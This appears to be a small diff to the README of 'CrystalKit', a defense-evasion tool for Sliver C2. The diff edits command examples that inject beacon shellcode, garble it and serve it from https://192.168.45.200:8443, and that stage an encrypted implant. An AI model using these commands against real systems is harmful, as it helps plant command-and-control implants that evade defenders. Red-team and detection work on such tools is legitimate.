@@ -143,7 +143,7 @@ sliver > generate --format shellcode --os windows --arch amd64 \
 ```bash
 ./crystalkit inject \
   --shellcode /tmp/beacon.bin \
-  --url       https://192.168.45.200:8443/p \
+  --url       https://192.168.45.200:8443 \
   --output    build/ \
   --garble \
   --serve
@@ -189,7 +189,7 @@ sliver > generate --format shared --os windows --arch amd64 \
 # Encrypt and stage via in-process stager
 ./crystalkit stage \
   --pico build/implant.bin \
-  --url  https://192.168.45.200:8443/p \
+  --url  https://192.168.45.200:8443 \
   --serve
 ```
 
@@ -368,7 +368,7 @@ Verify `x86_64-w64-mingw32-gcc` and `nasm` are in `$PATH`.
 
 ## Suite Context
 
-CrystalKit is part of the **Sliver Defense Evasion Suite**. See `/home/kali/EVASION_SUITE.md` for the full overview.
+CrystalKit is part of the **Sliver Defense Evasion Suite**. See `EVASION_SUITE.md` in the repo root for the full overview.
 
 | Tool | Role |
 |------|------|
